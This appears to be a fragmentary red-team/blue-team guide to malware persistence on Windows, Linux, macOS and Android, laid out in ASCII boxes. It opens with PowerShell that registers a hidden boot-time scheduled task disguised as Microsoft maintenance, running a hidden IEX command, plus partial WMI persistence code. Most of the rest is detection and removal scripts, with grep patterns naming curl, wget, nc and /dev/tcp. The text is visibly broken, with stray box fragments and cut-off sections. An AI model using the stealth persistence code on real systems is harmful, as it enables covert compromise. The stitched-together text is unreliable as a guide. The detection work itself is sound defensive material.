│ │ # Hide task from Task Scheduler UI by modifying Security Descriptor │     │
│ │                                                                     │     │
│ │ # Create task normally first                                      │     │
│ │ $taskPath = "\Microsoft\Windows\Maintenance\"                     │     │
│ │ $taskName = "WinSxsCleanup"  # Blend with maintenance tasks       │     │
│ │                                                                     │     │
│ │ # Option 1: Set task as hidden via XML                            │     │
│ │ $xml = @"                                                          │     │
│ │ <?xml version="1.0" encoding="UTF-16"?>                           │     │
│ │ <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">│     │
│ │   <RegistrationInfo>                                               │     │
│ │     <Author>Microsoft Corporation</Author>                        │     │
│ │   </RegistrationInfo>                                              │     │
│ │   <Triggers>                                                       │     │
│ │     <BootTrigger><Enabled>true</Enabled></BootTrigger>           │     │
│ │   </Triggers>                                                      │     │
│ │   <Settings><Hidden>true</Hidden></Settings>                      │     │
│ │   <Actions>                                                        │     │
│ │     <Exec><Command>powershell.exe</Command>                       │     │
│ │     <Arguments>-w hidden -c IEX(...)</Arguments></Exec>           │     │
│ │   </Actions>                                                       │     │
│ │ </Task>                                                            │     │
│ │ "@                                                                  │     │
│ │ Register-ScheduledTask -TaskName $taskName -TaskPath $taskPath -Xml $xml │
│ │                                                                     │     │
│ │ # Option 2: Remove read permissions (task won't show in UI)      │     │
│ │ $task = Get-ScheduledTask -TaskName $taskName                     │     │
│ │ # Modify SD to remove read access for users                       │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ BLUE TEAM: DETECTION                                                         │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ DETECTION METHOD 1: List All Scheduled Tasks                                 │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ # PowerShell - Get all tasks                                      │     │
│ │ Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} |      │     │
│ │     ForEach-Object {                                               │     │
│ │         $info = Get-ScheduledTaskInfo $_.TaskName -TaskPath $_.TaskPath │
│ │         [PSCustomObject]@{                                         │     │
│ │             Name = $_.TaskName                                     │     │
│ │             Path = $_.TaskPath                                     │     │
│ │             Author = $_.Author                                     │     │
│ │             Actions = ($_.Actions | ForEach-Object {$_.Execute + " " + $_.Arguments}) -join "; " │
│ │             LastRun = $info.LastRunTime                           │     │
│ │         }                                                          │     │
│ │     } | Format-Table -AutoSize                                    │     │
│ │                                                                     │     │
│ │ # Also check for hidden tasks in: C:\Windows\System32\Tasks\     │     │
│ │ Get-ChildItem -Path "C:\Windows\System32\Tasks" -Recurse |        │     │
│ │     Select-Object FullName, LastWriteTime | Sort-Object LastWriteTime -Descending │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ DETECTION METHOD 2: Event Log Monitoring                                     │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ # Check Task Scheduler event logs                                 │     │
│ │ # Event ID 106: Task registered                                   │     │
│ │ # Event ID 140: Task updated                                      │     │
│ │ # Event ID 141: Task deleted                                      │     │
│ │ # Event ID 200: Task executed                                     │     │
│ │                                                                     │     │
│ │ Get-WinEvent -LogName "Microsoft-Windows-TaskScheduler/Operational" ` │  │
│ │     -FilterXPath "*[System[EventID=106 or EventID=140]]" |        │     │
│ │     Select-Object TimeCreated, Message -First 50                  │     │
│ │                                                                     │     │
│ │ # Security log (if auditing enabled)                              │     │
│ │ # Event ID 4698: Scheduled task created                           │     │
│ │ # Event ID 4699: Scheduled task deleted                           │     │
│ │ # Event ID 4702: Scheduled task updated                           │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ RED FLAGS TO LOOK FOR:                                                       │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ ⚠ Tasks with no author or unknown author                         │     │
│ │ ⚠ Actions containing PowerShell, cmd, mshta, wscript             │     │
│ │ ⚠ Actions with network commands (IEX, IWR, curl, wget)           │     │
│ │ ⚠ Tasks in unusual paths (not under Microsoft\Windows\)          │     │
│ │ ⚠ Tasks created recently (last 30 days)                          │     │
│ │ ⚠ Tasks with Hidden=true in settings                             │     │
│ │ ⚠ Tasks triggered by logon for specific users                    │     │
│ │ ⚠ Repetition intervals (checking in frequently)                  │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ REMOVAL PROCEDURE                                                            │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ # Unregister malicious task                                       │     │
│ │ Unregister-ScheduledTask -TaskName "MaliciousTask" -Confirm:$false │     │
│ │                                                                     │     │
│ │ # Or via schtasks (works for hidden tasks too)                   │     │
│ │ schtasks /Delete /TN "MaliciousTask" /F                           │     │
│ │                                                                     │     │
│ │ # Delete associated payload files                                 │     │
│ │ Remove-Item -Path "C:\Path\To\Payload.exe" -Force                 │     │
│ │                                                                     │     │
│ │ # Verify task is removed                                          │     │
│ │ Get-ScheduledTask -TaskName "MaliciousTask" -ErrorAction SilentlyContinue │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

```
│   │            └──────────┬─────────────┘                          │        │
│   │                       ▼                                        │        │
│   │          3. FILTER-TO-CONSUMER BINDING                         │        │
│   │          ┌─────────────────────────────┐                       │        │
│   │          │ __FilterToConsumerBinding  │                       │        │

│        │                                                                     │

│ │ GUI r                                                              │     │

│ │ function Install-WMIPersistence {                                 │     │
│ │     param(                                                         │     │
│ │         [string]$FilterName = "SystemCoreFilter",                 │     │

│ │         "'Win32_PerfFormattedData_PerfOS_System' AND " +          │     │

│ │         }                                                          │     │

│ │                                                                     │     │
│ │ # ALL-IN-ONE: Complete WMI persistence detection                  │     │
│ │ $filters = Get-WmiObject -Namespace "root\subscription" -Class __EventFilter │
│ │ $consumers = Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer │
│ │ $bindings = Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding │
│ │                                                                     │     │
│ │ Write-Host "=== EVENT FILTERS ===" -ForegroundColor Yellow        │     │
│ │ $filters | Select-Object Name, Query | Format-List               │     │
│ │                                                                     │     │
│ │ Write-Host "=== EVENT CONSUMERS ===" -ForegroundColor Yellow      │     │
│ │ $consumers | Select-Object Name, CommandLineTemplate | Format-List │     │
│ │                                                                     │     │
│ │ Write-Host "=== BINDINGS ===" -ForegroundColor Yellow             │     │
│ │ $bindings | ForEach-Object {                                      │     │
│ │     "Filter: $($_.Filter) -> Consumer: $($_.Consumer)"           │     │
│ │ }                                                                  │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ DETECTION METHOD 2: Sysmon WMI Monitoring                                    │

│ │   <EventFiltering>                                                │     │
│ │     <!-- Event ID 19: WmiEventFilter activity -->                │     │
│ │     <WmiEvent onmatch="include">                                  │     │
│ │       <Operation condition="is">Created</Operation>               │     │
│ │     </WmiEvent>                                                   │     │
│ │     <!-- Event ID 20: WmiEventConsumer activity -->               │     │

│ │                                                                     │     │

│ │     -FilterXPath "*[System[EventID=19 or EventID=20 or EventID=21]]" │  │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │

│ ┌─────────────────────────────────────────────────────────────────────┐     │

│ │ ⚠ Filters with generic names                                     │     │
│ │ ⚠ Consumers with encoded commands                                │     │
│ │ ⚠ Recently created subscriptions                                 │     │

│ └─────────────────────────────────────────────────────────────────────┘     │

│                                                                              │
│ ┌─────────────────────────────────────────────────────────────────────┐     │

│ │                                                                     │     │
│ │ # 1. Remove bindings first                                        │     │
│ │ Get-WmiObject -Namespace "root\subscription" `                    │     │
│ │     -Class __FilterToConsumerBinding |                            │     │
│ │     Where-Object {$_.Filter -like "*MaliciousFilter*"} |         │     │
│ │     Remove-WmiObject                                               │     │
│ │                                                                     │     │
│ │ # 2. Remove consumers                                             │     │
│ │ Get-WmiObject -Namespace "root\subscription" `                    │     │
│ │     -Class __EventConsumer |                                      │     │
│ │     Where-Object {$_.Name -eq "MaliciousConsumer"} |             │     │
│ │     Remove-WmiObject                                               │     │
│ │                                                                     │     │
│ │ # 3. Remove filters                                               │     │
│ │ Get-WmiObject -Namespace "root\subscription" `                    │     │
│ │     -Class __EventFilter |                                        │     │
│ │     Where-Object {$_.Name -eq "MaliciousFilter"} |               │     │
│ │     Remove-WmiObject                                               │     │
│ │                                                                     │     │
│ │ # Nuclear option: Remove ALL non-default subscriptions           │     │
│ │ Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Remove-WmiObject │
│ │ Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer | Remove-WmiObject │
│ └─────────────────────────────────────────────────────────────────────┘     │

└─────────────────────────────────────────────────────────────────────────────┘
```

## Comprehensive Persistence Detection Script

```powershell
# =====================================================
# COMPREHENSIVE PERSISTENCE DETECTION SCRIPT
# For Blue Team / Incident Response
# =====================================================

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host " PERSISTENCE MECHANISM DETECTION SCRIPT  " -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

$findings = @()

# 1. Registry Run Keys
Write-Host "`n[1/8] Checking Registry Run Keys..." -ForegroundColor Yellow
$runPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\WoW6432Node\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($path in $runPaths) {
    $items = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue
    if ($items) {
        $items.PSObject.Properties | Where-Object {$_.Name -notlike "PS*"} | ForEach-Object {
            $findings += [PSCustomObject]@{
                Type = "Registry Run Key"
                Name = $_.Name
                Value = $_.Value
                Location = $path
            }
        }
    }
}

# 2. Scheduled Tasks
Write-Host "[2/8] Checking Scheduled Tasks..." -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | ForEach-Object {
    $actions = $_.Actions | ForEach-Object {$_.Execute + " " + $_.Arguments}
    if ($actions -match "powershell|cmd|wscript|mshta|http|base64|enc") {
        $findings += [PSCustomObject]@{
            Type = "Scheduled Task"
            Name = $_.TaskName
            Value = $actions -join "; "
            Location = $_.TaskPath
        }
    }
}

# 3. Services
Write-Host "[3/8] Checking Services..." -ForegroundColor Yellow
Get-WmiObject Win32_Service | Where-Object {
    $_.StartMode -eq 'Auto' -and
    $_.PathName -notmatch 'Windows\\System32|Program Files'
} | ForEach-Object {
    $findings += [PSCustomObject]@{
        Type = "Service"
        Name = $_.Name
        Value = $_.PathName
        Location = "Services"
    }
}

# 4. WMI Subscriptions
Write-Host "[4/8] Checking WMI Subscriptions..." -ForegroundColor Yellow
$wmiFilters = Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -ErrorAction SilentlyContinue
$wmiConsumers = Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer -ErrorAction SilentlyContinue
foreach ($filter in $wmiFilters) {
    $findings += [PSCustomObject]@{
        Type = "WMI Filter"
        Name = $filter.Name
        Value = $filter.Query
        Location = "root\subscription"
    }
}
foreach ($consumer in $wmiConsumers) {
    $findings += [PSCustomObject]@{
        Type = "WMI Consumer"
        Name = $consumer.Name
        Value = $consumer.CommandLineTemplate
        Location = "root\subscription"
    }
}

# 5. Startup Folder
Write-Host "[5/8] Checking Startup Folders..." -ForegroundColor Yellow
$startupPaths = @(
    [Environment]::GetFolderPath('Startup'),
    [Environment]::GetFolderPath('CommonStartup')
)
foreach ($path in $startupPaths) {
    Get-ChildItem -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
        $findings += [PSCustomObject]@{
            Type = "Startup Folder"
            Name = $_.Name
            Value = $_.FullName
            Location = $path
        }
    }
}

# 6. COM Hijacking
Write-Host "[6/8] Checking for COM Hijacking..." -ForegroundColor Yellow
Get-ChildItem -Path "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue | ForEach-Object {
    $clsid = $_.PSChildName
    $dll = Get-ItemProperty -Path "$($_.PSPath)\InprocServer32" -ErrorAction SilentlyContinue
    if ($dll -and $dll.'(Default)') {
        $findings += [PSCustomObject]@{
            Type = "Potential COM Hijack"
            Name = $clsid
            Value = $dll.'(Default)'
            Location = "HKCU\Software\Classes\CLSID"
        }
    }
}

# 7. Winlogon
Write-Host "[7/8] Checking Winlogon..." -ForegroundColor Yellow
$winlogon = Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
if ($winlogon.Shell -ne "explorer.exe") {
    $findings += [PSCustomObject]@{
        Type = "Winlogon Shell"
        Name = "Shell"
        Value = $winlogon.Shell
        Location = "HKLM\...\Winlogon"
    }
}
if ($winlogon.Userinit -ne "C:\Windows\system32\userinit.exe,") {
    $findings += [PSCustomObject]@{
        Type = "Winlogon Userinit"
        Name = "Userinit"
        Value = $winlogon.Userinit
        Location = "HKLM\...\Winlogon"
    }
}

# 8. Image File Execution Options (Debugger hijack)
Write-Host "[8/8] Checking IFEO..." -ForegroundColor Yellow
Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" -ErrorAction SilentlyContinue | ForEach-Object {
    $debugger = Get-ItemProperty -Path $_.PSPath -Name "Debugger" -ErrorAction SilentlyContinue
    if ($debugger.Debugger) {
        $findings += [PSCustomObject]@{
            Type = "IFEO Debugger"
            Name = $_.PSChildName
            Value = $debugger.Debugger
            Location = "IFEO"
        }
    }
}

# Display Results
Write-Host "`n==========================================" -ForegroundColor Cyan
Write-Host " FINDINGS SUMMARY                         " -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

if ($findings.Count -eq 0) {
    Write-Host "`nNo suspicious persistence mechanisms found." -ForegroundColor Green
} else {
    Write-Host "`nFound $($findings.Count) potential persistence mechanism(s):" -ForegroundColor Red
    $findings | Format-Table -AutoSize

    # Export to CSV
    $findings | Export-Csv -Path "$env:TEMP\persistence_findings.csv" -NoTypeInformation
    Write-Host "`nResults exported to: $env:TEMP\persistence_findings.csv" -ForegroundColor Yellow
}
```

## Linux Comprehensive Detection Script

```bash
#!/bin/bash
# =====================================================
# LINUX PERSISTENCE DETECTION SCRIPT
# For Blue Team / Incident Response
# =====================================================

echo "=========================================="
echo " LINUX PERSISTENCE DETECTION SCRIPT"
echo "=========================================="

# Colors
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

findings=0

# 1. Cron Jobs
echo -e "\n${YELLOW}[1/8] Checking Cron Jobs...${NC}"
echo "--- User Crontabs ---"
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -l -u $user 2>/dev/null | grep -v "^#" | grep -v "^$" && \
        echo -e "${RED}Found crontab for: $user${NC}" && ((findings++))
done

echo "--- System Cron ---"
ls -la /etc/cron.d/ 2>/dev/null
find /etc/cron.* -type f -mtime -30 2>/dev/null | while read f; do
    echo -e "${YELLOW}Recently modified: $f${NC}"
    ((findings++))
done

# 2. Systemd Services
echo -e "\n${YELLOW}[2/8] Checking Systemd Services...${NC}"
find /etc/systemd/system ~/.config/systemd -name "*.service" -mtime -30 2>/dev/null | while read f; do
    echo -e "${RED}Recently created service: $f${NC}"
    grep "ExecStart" "$f"
    ((findings++))
done

# Check for suspicious ExecStart
grep -rh "ExecStart" /etc/systemd/system/ 2>/dev/null | grep -E "curl|wget|bash|nc|python" && ((findings++))

# 3. Shell Profiles
echo -e "\n${YELLOW}[3/8] Checking Shell Profiles...${NC}"
for profile in ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc /etc/profile /etc/bash.bashrc; do
    if [ -f "$profile" ]; then
        grep -E "curl|wget|nc |/dev/tcp|python|base64" "$profile" 2>/dev/null && \
            echo -e "${RED}Suspicious content in: $profile${NC}" && ((findings++))
    fi
done

# Check /etc/profile.d/
find /etc/profile.d/ -type f -mtime -30 2>/dev/null | while read f; do
    echo -e "${YELLOW}Recently modified profile.d script: $f${NC}"
done

# 4. SSH Authorized Keys
echo -e "\n${YELLOW}[4/8] Checking SSH Authorized Keys...${NC}"
find /home /root -name "authorized_keys" 2>/dev/null | while read f; do
    echo "=== $f ==="
    # Check for command= option
    grep "command=" "$f" 2>/dev/null && echo -e "${RED}WARNING: Forced command found!${NC}" && ((findings++))
    # Count keys
    count=$(wc -l < "$f" 2>/dev/null)
    echo "Keys: $count"
    # Recently modified?
    if [ $(find "$f" -mtime -7 2>/dev/null | wc -l) -gt 0 ]; then
        echo -e "${YELLOW}Recently modified!${NC}"
        ((findings++))
    fi
done

# 5. LD_PRELOAD
echo -e "\n${YELLOW}[5/8] Checking LD_PRELOAD...${NC}"
if [ -f /etc/ld.so.preload ]; then
    echo -e "${RED}WARNING: /etc/ld.so.preload exists!${NC}"
    cat /etc/ld.so.preload
    ((findings++))
fi

grep -r "LD_PRELOAD" /etc/environment /etc/profile* 2>/dev/null && ((findings++))

# 6. Init Scripts (for non-systemd)
echo -e "\n${YELLOW}[6/8] Checking Init Scripts...${NC}"
if [ -f /etc/rc.local ]; then
    grep -v "^#" /etc/rc.local | grep -v "^$" | grep -v "exit 0"
fi
find /etc/init.d/ -type f -mtime -30 2>/dev/null

# 7. Setuid/Setgid Binaries
echo -e "\n${YELLOW}[7/8] Checking for unusual SUID binaries...${NC}"
find / -perm -4000 -type f 2>/dev/null | while read f; do
    # Check if in standard locations
    if [[ ! "$f" =~ ^(/usr/bin|/usr/sbin|/bin|/sbin|/usr/lib|/usr/libexec) ]]; then
        echo -e "${RED}Unusual SUID binary: $f${NC}"
        ((findings++))
    fi
done

# 8. Hidden Files/Directories
echo -e "\n${YELLOW}[8/8] Checking for suspicious hidden files...${NC}"
find /tmp /var/tmp /dev/shm -name ".*" -type f 2>/dev/null | head -20
find /usr /var -name ".*" -type d 2>/dev/null | grep -v ".git"

# Summary
echo -e "\n=========================================="
echo -e " SCAN COMPLETE"
echo -e "=========================================="
if [ $findings -gt 0 ]; then
    echo -e "${RED}Found $findings potential persistence mechanism(s)${NC}"
else
    echo -e "${GREEN}No obvious persistence mechanisms found${NC}"
fi
```

## macOS Comprehensive Detection Script

```bash
#!/bin/bash
# =====================================================
# MACOS PERSISTENCE DETECTION SCRIPT
# For Blue Team / Incident Response
# =====================================================

echo "=========================================="
echo " MACOS PERSISTENCE DETECTION SCRIPT"
echo "=========================================="

# Colors
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

findings=0

# 1. LaunchAgents
echo -e "\n${YELLOW}[1/7] Checking LaunchAgents...${NC}"
echo "--- User LaunchAgents ---"
ls -la ~/Library/LaunchAgents/ 2>/dev/null
find ~/Library/LaunchAgents -name "*.plist" -mtime -30 2>/dev/null | while read f; do
    echo -e "${YELLOW}Recently modified: $f${NC}"
    ((findings++))
done

echo "--- System LaunchAgents ---"
ls -la /Library/LaunchAgents/ 2>/dev/null

# Check for suspicious content
grep -r "curl\|wget\|bash\|python\|/tmp" ~/Library/LaunchAgents/ /Library/LaunchAgents/ 2>/dev/null && ((findings++))

# 2. LaunchDaemons
echo -e "\n${YELLOW}[2/7] Checking LaunchDaemons...${NC}"
ls -la /Library/LaunchDaemons/ 2>/dev/null
find /Library/LaunchDaemons -name "*.plist" -mtime -30 2>/dev/null

# 3. Login Items
echo -e "\n${YELLOW}[3/7] Checking Login Items...${NC}"
osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null

# 4. Cron Jobs
echo -e "\n${YELLOW}[4/7] Checking Cron Jobs...${NC}"
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null

# 5. Shell Profiles
echo -e "\n${YELLOW}[5/7] Checking Shell Profiles...${NC}"
for profile in ~/.zshrc ~/.bash_profile ~/.bashrc ~/.zprofile; do
    if [ -f "$profile" ]; then
        grep -E "curl|wget|nc |/dev/tcp|python" "$profile" 2>/dev/null && \
            echo -e "${RED}Suspicious content in: $profile${NC}" && ((findings++))
    fi
done

# 6. Periodic Scripts
echo -e "\n${YELLOW}[6/7] Checking Periodic Scripts...${NC}"
ls -la /etc/periodic/daily/ /etc/periodic/weekly/ /etc/periodic/monthly/ 2>/dev/null
find /etc/periodic -mtime -30 2>/dev/null

# 7. Authorization Plugins
echo -e "\n${YELLOW}[7/7] Checking Authorization Plugins...${NC}"
ls -la /Library/Security/SecurityAgentPlugins/ 2>/dev/null

# Summary
echo -e "\n=========================================="
echo -e " SCAN COMPLETE"
echo -e "=========================================="
if [ $findings -gt 0 ]; then
    echo -e "${RED}Found $findings potential persistence mechanism(s)${NC}"
else
    echo -e "${GREEN}No obvious persistence mechanisms found${NC}"
fi

echo -e "\n${YELLOW}Recommended: Run KnockKnock from Objective-See for comprehensive analysis${NC}"
echo "https://objective-see.com/products/knockknock.html"
```

## Android Method 1: Boot Receiver

```
┌─────────────────────────────────────────────────────────────────────────────┐

├─────────────────────────────────────────────────────────────────────────────┤

│ │     <intent-filter>                                                │     │

│ │         <action android:name="android.intent.action.QUICKBOOT_POWERON"/>│   │
│ │         <category android:name="android.intent.category.DEFAULT"/> │     │
│ │     </intent-filter>                                               │     │
│ │ </receiver>                                                        │     │
│ │                                                                     │     │

│                                                                              │
│ BootReceiver.java:                                                           │
```

```
│ │ • Package Manager apps                                            │     │
│ │ • Malwarebytes Mobile                                             │     │
│ │                                                                     │     │
```
